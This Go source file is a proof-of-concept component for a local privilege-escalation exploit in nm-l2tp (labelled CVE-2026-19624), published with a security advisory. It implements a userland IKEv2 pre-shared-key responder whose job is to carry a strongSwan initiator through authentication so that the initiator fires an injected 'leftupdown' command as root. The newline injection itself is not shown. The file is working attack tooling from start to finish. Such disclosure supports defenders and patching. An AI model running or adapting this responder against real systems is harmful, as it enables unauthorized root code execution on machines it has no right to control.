// LinnemanLabs - nm-l2tp PoC - root exec from newline injection
// CVE-2026-19624
//
// https://linnemanlabs.com/posts/nm-l2tp-newline-to-root/
// https://github.com/linnemanlabs/advisories/
//
// nm-l2tp-responder: a minimal, userland IKEv2 PSK responder.
//
// Sets up an IKE responder that will satisfy a strongSwan initiator far enough that
// it runs the injected `leftupdown` action. We complete IKE_SA_INIT + IKE_AUTH and
// never touch the kernel. Everything after authentication is dropped.
//
// Runs as unprivileged user.
//
// Usage: go run nm-l2tp-responder.go [-listen :5500] [-psk linnemanlabs-poc] [-id 127.0.0.2]
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/binary"
	"flag"
	"fmt"
	"math/big"
	"net"
)

// IKEv2 constants
const (
	exchINIT = 34
	exchAUTH = 35

	flagInitiator = 0x08
	flagResponse  = 0x20

	pNONE   = 0
	pSA     = 33
	pKE     = 34
	pNONCE  = 40
	pNOTIFY = 41
	pIDi    = 35
	pIDr    = 36
	pAUTH   = 39
	pTSi    = 44
	pTSr    = 45
	pSK     = 46

	tENCR  = 1
	tPRF   = 2
	tINTEG = 3
	tDH    = 4
	tESN   = 5

	encrAES_CBC            = 12
	prfHMAC_SHA2_256       = 5
	integHMAC_SHA2_256_128 = 12
	dhMODP2048             = 14

	nNAT_SRC       = 16388
	nNAT_DST       = 16389
	nUSE_TRANSPORT = 16391

	authSharedKey = 2 // AUTH method: pre-shared key

	keyLen   = 16 // AES-128
	integKey = 32 // HMAC-SHA256 key
	prfKey   = 32 // SK_d, SK_pi, SK_pr
	icvLen   = 16 // HMAC-SHA256-128 truncated
	ivLen    = 16 // AES-CBC IV
)

// MODP-2048
// who doesnt like a good scary looking blob in their exploit?
var modp2048P, _ = new(big.Int).SetString(
	"FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"+
		"29024E088A67CC74020BBEA63B139B22514A08798E3404DD"+
		"EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"+
		"E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"+
		"EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"+
		"C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"+
		"83655D23DCA3AD961C62F356208552BB9ED529077096966D"+
		"670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"+
		"E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9"+
		"DE2BCBF6955817183995497CEA956AE515D2261898FA0510"+
		"15728E5A8AACAA68FFFFFFFFFFFFFFFF", 16)
var modp2048G = big.NewInt(2)

// config + per-SA state
var (
	psk  []byte
	myID net.IP
)

type sa struct {
	spiI, spiR      []byte
	ni, nr          []byte
	skD, skAi, skAr []byte
	skEi, skEr      []byte
	skPi, skPr      []byte
	realMsg1        []byte // initiator's IKE_SA_INIT request (no NAT-T marker)
	realMsg2        []byte // our IKE_SA_INIT response (no NAT-T marker)
	childSPIi       []byte
	tsi, tsr        []byte
}

var sessions = map[string]*sa{}

func main() {
	listen := flag.String("listen", ":5500", "UDP listen address")
	pskStr := flag.String("psk", "linnemanlabs-poc", "pre-shared key")
	idStr := flag.String("id", "127.0.0.2", "our IKE identity (IPv4)")
	flag.Parse()
	psk = []byte(*pskStr)
	myID = net.ParseIP(*idStr).To4()

	addr, _ := net.ResolveUDPAddr("udp", *listen)
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		fmt.Println("listen:", err)
		return
	}
	fmt.Printf("[*] nm-l2tp-responder listening on %s psk=%q id=%s\n", *listen, *pskStr, myID)

	buf := make([]byte, 4096)
	for {
		n, peer, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}
		pkt := append([]byte(nil), buf[:n]...)
		// strip the NAT-T non-ESP marker if present
		marker := false
		if len(pkt) >= 4 && bytes.Equal(pkt[:4], []byte{0, 0, 0, 0}) {
			pkt = pkt[4:]
			marker = true
		}
		resp := handle(pkt, peer)
		if resp != nil {
			if marker {
				resp = append([]byte{0, 0, 0, 0}, resp...)
			}
			conn.WriteToUDP(resp, peer)
		}
	}
}

func handle(pkt []byte, peer *net.UDPAddr) []byte {
	if len(pkt) < 28 {
		return nil
	}
	spiI := pkt[0:8]
	spiR := pkt[8:16]
	first := pkt[16]
	exch := pkt[18]
	switch exch {
	case exchINIT:
		return handleInit(pkt, first, spiI)
	case exchAUTH:
		return handleAuth(pkt, first, spiI, spiR, peer)
	}
	return nil
}

// IKE_SA_INIT
func handleInit(pkt []byte, first byte, spiI []byte) []byte {
	var kei, ni []byte
	var saBlock []byte
	walk(pkt[28:], first, func(ptype byte, body []byte) {
		switch ptype {
		case pKE:
			// body: DH group(2) reserved(2) keydata
			kei = body[4:]
		case pNONCE:
			ni = body
		case pSA:
			saBlock = body
		}
	})
	if kei == nil || ni == nil || saBlock == nil {
		fmt.Println("[-] INIT: missing KE/Nonce/SA")
		return nil
	}

	s := &sa{spiI: append([]byte(nil), spiI...)}
	s.spiR = randBytes(8)
	s.ni = ni
	s.nr = randBytes(32)
	s.realMsg1 = append([]byte(nil), pkt...)

	// DH: our private b, public g^b, shared (g^i)^b
	b, _ := rand.Int(rand.Reader, modp2048P)
	gb := new(big.Int).Exp(modp2048G, b, modp2048P)
	gi := new(big.Int).SetBytes(kei)
	shared := new(big.Int).Exp(gi, b, modp2048P)
	gbBytes := leftpad(gb.Bytes(), 256)
	sharedBytes := leftpad(shared.Bytes(), 256)

	// keys
	s.deriveKeys(sharedBytes)

	// Response: SA (echo the initiator's proposal #1) + KE (our public) + Nonce + NAT-D.
	// hashes only need valid length, charon decided NAT is in effect, contents don't matter
	out := assemble(spiI, s.spiR, exchINIT, flagResponse, 0, []pl{
		{pSA, buildSAInit()},
		{pKE, buildKE(gbBytes)},
		{pNONCE, s.nr},
		{pNOTIFY, buildNotifyRaw(nNAT_SRC, natdHash(spiI, s.spiR, myID, 4500))},
		{pNOTIFY, buildNotifyRaw(nNAT_DST, natdHash(spiI, s.spiR, net.IPv4(127, 0, 0, 1).To4(), 4500))},
	})
	s.realMsg2 = append([]byte(nil), out...)
	sessions[string(spiI)] = s
	fmt.Printf("[*] INIT: SPIi=%x -> responded (SPIr=%x)\n", spiI, s.spiR)
	return out
}

func (s *sa) deriveKeys(shared []byte) {
	skeyseed := prf(append(append([]byte(nil), s.ni...), s.nr...), shared)
	seed := chain(s.ni, s.nr, s.spiI, s.spiR)
	km := prfplus(skeyseed, seed, prfKey+integKey*2+keyLen*2+prfKey*2)
	o := 0
	take := func(n int) []byte { r := km[o : o+n]; o += n; return r }
	s.skD = take(prfKey)
	s.skAi = take(integKey)
	s.skAr = take(integKey)
	s.skEi = take(keyLen)
	s.skEr = take(keyLen)
	s.skPi = take(prfKey)
	s.skPr = take(prfKey)
}

// IKE_AUTH
func handleAuth(pkt []byte, first byte, spiI, _ []byte, _ *net.UDPAddr) []byte {
	s := sessions[string(spiI)]
	if s == nil {
		fmt.Println("[-] AUTH: no session for", fmt.Sprintf("%x", spiI))
		return nil
	}
	// find the SK payload, decrypt
	var skBody []byte
	walk(pkt[28:], first, func(ptype byte, body []byte) {
		if ptype == pSK {
			skBody = body
		}
	})
	if skBody == nil {
		fmt.Println("[-] AUTH: no SK payload")
		return nil
	}
	// verify ICV over the whole message minus the trailing ICV
	if !verifyICV(pkt, s.skAi) {
		fmt.Println("[-] AUTH: ICV verify FAILED")
		return nil
	}
	// SK payload body = IV | ciphertext | ICV. decrypt.
	inner, innerFirst := s.decryptSK(pkt, first)
	if inner == nil {
		fmt.Println("[-] AUTH: decrypt failed")
		return nil
	}

	var idiRaw, authRaw, saChild, tsi, tsr []byte
	var authMethod byte
	walk(inner, innerFirst, func(ptype byte, body []byte) {
		switch ptype {
		case pIDi:
			idiRaw = body // full ID payload body: type(1) res(3) data
		case pAUTH:
			authMethod = body[0]
			authRaw = body[4:]
		case pSA:
			saChild = body
		case pTSi:
			tsi = body
		case pTSr:
			tsr = body
		}
	})
	if idiRaw == nil || authRaw == nil {
		fmt.Println("[-] AUTH: missing IDi/AUTH")
		return nil
	}
	_ = authMethod
	s.tsi, s.tsr = tsi, tsr

	// verify initiator AUTH (PSK)
	macIDi := prf(s.skPi, idiRaw)
	initOctets := chain(s.realMsg1, s.nr, macIDi)
	expected := prf(prfPSK(psk), initOctets)
	if !hmac.Equal(expected, authRaw) {
		fmt.Printf("[-] AUTH: initiator PSK mismatch (wrong -psk?)\n")
		return nil
	}
	fmt.Println("[*] AUTH: initiator PSK verified OK")

	// build our IDr (ID_IPV4_ADDR)
	idrBody := append([]byte{1, 0, 0, 0}, myID...)
	macIDr := prf(s.skPr, idrBody)
	respOctets := chain(s.realMsg2, s.ni, macIDr)
	ourAuth := prf(prfPSK(psk), respOctets)
	authBody := append([]byte{authSharedKey, 0, 0, 0}, ourAuth...)

	// select first proposal from saChild, assign our SPI, echo TS + transport notify
	childResp := selectChildSA(saChild, s)

	// inner payloads for the response
	innerResp := assembleInner([]pl{
		{pIDr, idrBody},
		{pAUTH, authBody},
		{pSA, childResp},
		{pTSi, tsi},
		{pTSr, tsr},
		{pNOTIFY, buildNotifyRaw(nUSE_TRANSPORT, nil)},
	})
	// encrypt into an SK payload, build the full IKE_AUTH response
	out := s.encryptAuth(innerResp, spiI)
	fmt.Println("[+] AUTH: responded - charon should install SA and fire leftupdown")
	return out
}

// crypto helpers
func prf(key, data []byte) []byte {
	h := hmac.New(sha256.New, key)
	h.Write(data)
	return h.Sum(nil)
}
func prfPSK(k []byte) []byte { return prf(k, []byte("Key Pad for IKEv2")) }
func prfplus(key, seed []byte, n int) []byte {
	var out, t []byte
	for i := byte(1); len(out) < n; i++ {
		t = prf(key, chain(t, seed, []byte{i}))
		out = append(out, t...)
	}
	return out[:n]
}
func natdHash(spiI, spiR, ip net.IP, port uint16) []byte {
	b := chain(spiI, spiR, ip.To4(), be16(port))
	s := sha1.Sum(b)
	return s[:]
}

func (s *sa) decryptSK(pkt []byte, first byte) ([]byte, byte) {
	// walk the payload chain to the SK (Encrypted) payload
	off := 28
	nxt := first
	for off < len(pkt) {
		thisType := nxt
		nxt = pkt[off]
		plen := int(binary.BigEndian.Uint16(pkt[off+2 : off+4]))
		if thisType == pSK {
			skNext := pkt[off] // next payload = first inner payload type
			body := pkt[off+4 : off+plen]
			iv := body[:ivLen]
			ct := body[ivLen : len(body)-icvLen]
			block, _ := aes.NewCipher(s.skEi)
			mode := cipher.NewCBCDecrypter(block, iv)
			pt := make([]byte, len(ct))
			mode.CryptBlocks(pt, ct)
			// remove padding: last byte = pad length
			padLen := int(pt[len(pt)-1])
			pt = pt[:len(pt)-1-padLen]
			return pt, skNext
		}
		off += plen
	}
	return nil, 0
}

func verifyICV(pkt, skAi []byte) bool {
	if len(pkt) < icvLen {
		return false
	}
	mac := hmac.New(sha256.New, skAi)
	mac.Write(pkt[:len(pkt)-icvLen])
	sum := mac.Sum(nil)[:icvLen]
	return hmac.Equal(sum, pkt[len(pkt)-icvLen:])
}

func (s *sa) encryptAuth(inner []byte, spiI []byte) []byte {
	// inner is the concatenated inner payloads, first inner type is inner[... ] - we track it
	firstInner := innerFirstType
	// pad plaintext: (len + padlen(1)) % block == 0
	pt := append([]byte(nil), inner...)
	padLen := (aes.BlockSize - (len(pt)+1)%aes.BlockSize) % aes.BlockSize
	pt = append(pt, make([]byte, padLen)...)
	pt = append(pt, byte(padLen))
	iv := randBytes(ivLen)
	block, _ := aes.NewCipher(s.skEr)
	mode := cipher.NewCBCEncrypter(block, iv)
	ct := make([]byte, len(pt))
	mode.CryptBlocks(ct, pt)
	skBody := append(append([]byte(nil), iv...), ct...)
	// SK payload = generic hdr(nextpayload=firstInner) + body + ICV(placeholder)
	skLen := 4 + len(skBody) + icvLen
	sk := make([]byte, 4)
	sk[0] = firstInner
	binary.BigEndian.PutUint16(sk[2:], uint16(skLen))
	sk = append(sk, skBody...)
	sk = append(sk, make([]byte, icvLen)...)

	// full message: header + SK payload
	msg := make([]byte, 28)
	copy(msg[0:8], spiI)
	copy(msg[8:16], s.spiR)
	msg[16] = pSK
	msg[17] = 0x20
	msg[18] = exchAUTH
	msg[19] = flagResponse
	// msgid = 1 (IKE_AUTH)
	binary.BigEndian.PutUint32(msg[20:24], 1)
	msg = append(msg, sk...)
	binary.BigEndian.PutUint32(msg[24:28], uint32(len(msg)))
	// compute ICV over everything except the trailing icvLen
	mac := hmac.New(sha256.New, s.skAr)
	mac.Write(msg[:len(msg)-icvLen])
	copy(msg[len(msg)-icvLen:], mac.Sum(nil)[:icvLen])
	return msg
}

// track the type of the first inner payload for the SK next-payload field
var innerFirstType byte

func assembleInner(pls []pl) []byte {
	innerFirstType = pls[0].t
	var out []byte
	for i, p := range pls {
		next := byte(pNONE)
		if i+1 < len(pls) {
			next = pls[i+1].t
		}
		out = append(out, genhdr(next, len(p.b))...)
		out = append(out, p.b...)
	}
	return out
}

// IKEv2 message building
type pl struct {
	t byte
	b []byte
}

func assemble(spiI, spiR []byte, exch, flags byte, msgid uint32, pls []pl) []byte {
	msg := make([]byte, 28)
	copy(msg[0:8], spiI)
	copy(msg[8:16], spiR)
	msg[16] = pls[0].t
	msg[17] = 0x20
	msg[18] = exch
	msg[19] = flags
	binary.BigEndian.PutUint32(msg[20:24], msgid)
	for i, p := range pls {
		next := byte(pNONE)
		if i+1 < len(pls) {
			next = pls[i+1].t
		}
		msg = append(msg, genhdr(next, len(p.b))...)
		msg = append(msg, p.b...)
	}
	binary.BigEndian.PutUint32(msg[24:28], uint32(len(msg)))
	return msg
}

func genhdr(next byte, blen int) []byte {
	h := make([]byte, 4)
	h[0] = next
	binary.BigEndian.PutUint16(h[2:], uint16(blen+4))
	return h
}

// SA payload body for IKE_SA_INIT response: single proposal, our 4 transforms
func buildSAInit() []byte {
	transforms := [][]byte{
		transform(tENCR, encrAES_CBC, 128),
		transform(tINTEG, integHMAC_SHA2_256_128, 0),
		transform(tPRF, prfHMAC_SHA2_256, 0),
		transform(tDH, dhMODP2048, 0),
	}
	return proposal(1, 1, nil, transforms) // proto=1 (IKE), no SPI
}

func proposal(num, proto byte, spi []byte, transforms [][]byte) []byte {
	var tb []byte
	for i, t := range transforms {
		if i == len(transforms)-1 {
			t[0] = 0
		} else {
			t[0] = 3
		}
		tb = append(tb, t...)
	}
	p := make([]byte, 8)
	p[0] = 0 // last proposal
	p[4] = num
	p[5] = proto
	p[6] = byte(len(spi))
	p[7] = byte(len(transforms))
	p = append(p, spi...)
	p = append(p, tb...)
	binary.BigEndian.PutUint16(p[2:], uint16(len(p)))
	return p
}

func transform(ttype, tid byte, keylen int) []byte {
	t := make([]byte, 8)
	t[0] = 3
	t[4] = ttype
	binary.BigEndian.PutUint16(t[6:], uint16(tid))
	if keylen > 0 {
		attr := make([]byte, 4)
		binary.BigEndian.PutUint16(attr[0:], 0x800e) // key length attr, TV form
		binary.BigEndian.PutUint16(attr[2:], uint16(keylen))
		t = append(t, attr...)
	}
	binary.BigEndian.PutUint16(t[2:], uint16(len(t)))
	return t
}

func buildKE(pub []byte) []byte {
	b := make([]byte, 4)
	binary.BigEndian.PutUint16(b[0:], dhMODP2048)
	return append(b, pub...)
}

func buildNotifyRaw(ntype uint16, data []byte) []byte {
	b := make([]byte, 4)
	b[0] = 0 // protocol id
	b[1] = 0 // spi size
	binary.BigEndian.PutUint16(b[2:], ntype)
	return append(b, data...)
}

func selectChildSA(saChild []byte, s *sa) []byte {
	// pick the first proposal's transforms, assign a 4-byte ESP SPI.
	s.childSPIi = randBytes(4)
	var cNum, cProto, cNumXf byte
	var cXf []byte
	var fNum, fProto, fNumXf byte
	var fXf []byte
	have := false
	eachProposal(saChild, func(num, proto, numXf byte, spi, xf []byte) bool {
		if !have {
			fNum, fProto, fNumXf, fXf, have = num, proto, numXf, xf, true
		}
		if xfHasCBC(xf) {
			cNum, cProto, cNumXf, cXf = num, proto, numXf, xf
			return true
		}
		return false
	})
	if cXf == nil && have {
		cNum, cProto, cNumXf, cXf = fNum, fProto, fNumXf, fXf
	}
	if cXf != nil {
		fmt.Printf("[*] AUTH: child SA - selecting initiator proposal #%d (proto=%d, %d transforms), our SPI=%x\n", cNum, cProto, cNumXf, s.childSPIi)
		return buildProposalRaw(cNum, cProto, cNumXf, s.childSPIi, cXf)
	}
	fmt.Println("[*] AUTH: child SA - could not parse initiator SA, using fallback")
	transforms := [][]byte{
		transform(tENCR, encrAES_CBC, 128),
		transform(tINTEG, integHMAC_SHA2_256_128, 0),
		transform(tESN, 0, 0),
	}
	return proposal(1, 3, s.childSPIi, transforms)
}

func eachProposal(sa []byte, cb func(num, proto, numXf byte, spi, xf []byte) bool) {
	off := 0
	for off+8 <= len(sa) {
		more := sa[off]
		plen := int(binary.BigEndian.Uint16(sa[off+2 : off+4]))
		if plen < 8 || off+plen > len(sa) {
			return
		}
		num := sa[off+4]
		proto := sa[off+5]
		spiSize := int(sa[off+6])
		numXf := sa[off+7]
		if 8+spiSize > plen {
			return
		}
		spi := sa[off+8 : off+8+spiSize]
		xf := sa[off+8+spiSize : off+plen]
		if cb(num, proto, numXf, spi, xf) {
			return
		}
		if more == 0 {
			return
		}
		off += plen
	}
}

func xfHasCBC(xf []byte) bool {
	off := 0
	for off+8 <= len(xf) {
		tlen := int(binary.BigEndian.Uint16(xf[off+2 : off+4]))
		if tlen < 8 || off+tlen > len(xf) {
			return false
		}
		if xf[off+4] == tENCR && binary.BigEndian.Uint16(xf[off+6:off+8]) == uint16(encrAES_CBC) {
			return true
		}
		if xf[off] == 0 {
			return false
		}
		off += tlen
	}
	return false
}

func buildProposalRaw(num, proto, numXf byte, spi, xf []byte) []byte {
	p := make([]byte, 8)
	p[0] = 0 // last proposal
	p[4] = num
	p[5] = proto
	p[6] = byte(len(spi))
	p[7] = numXf
	p = append(p, spi...)
	p = append(p, xf...)
	binary.BigEndian.PutUint16(p[2:], uint16(len(p)))
	return p
}

// payload walking
func walk(data []byte, first byte, cb func(byte, []byte)) {
	nxt := first
	off := 0
	for nxt != pNONE && off+4 <= len(data) {
		thisType := nxt
		nxt = data[off]
		plen := int(binary.BigEndian.Uint16(data[off+2 : off+4]))
		if plen < 4 || off+plen > len(data) {
			return
		}
		cb(thisType, data[off+4:off+plen])
		off += plen
	}
}

func chain(parts ...[]byte) []byte {
	var out []byte
	for _, p := range parts {
		out = append(out, p...)
	}
	return out
}
func randBytes(n int) []byte { b := make([]byte, n); rand.Read(b); return b }
func be16(v uint16) []byte   { b := make([]byte, 2); binary.BigEndian.PutUint16(b, v); return b }
func leftpad(b []byte, n int) []byte {
	if len(b) >= n {
		return b[len(b)-n:]
	}
	return append(make([]byte, n-len(b)), b...)
}
